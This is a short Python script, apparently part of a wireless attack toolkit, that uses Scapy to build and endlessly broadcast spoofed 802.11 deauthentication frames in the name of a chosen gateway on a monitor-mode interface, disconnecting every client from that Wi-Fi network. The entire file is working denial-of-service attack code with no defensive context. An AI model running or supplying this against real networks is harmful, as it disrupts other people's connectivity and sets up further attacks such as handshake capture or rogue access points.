#!/usr/bin/env python3

from scapy.all import *

class deauth:
    def __init__(self, gateway):
        self.gateway = gateway
        self.target = "ff:ff:ff:ff:ff:ff"
        self.interface = "pnumbra-mon0"
    def run(self):
        dot11 = Dot11(addr1=self.target, addr2=self.gateway, addr3=self.gateway)
        # stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        # send the packet
        sendp(packet, inter=0.1, count=0, iface=self.interface, verbose=0)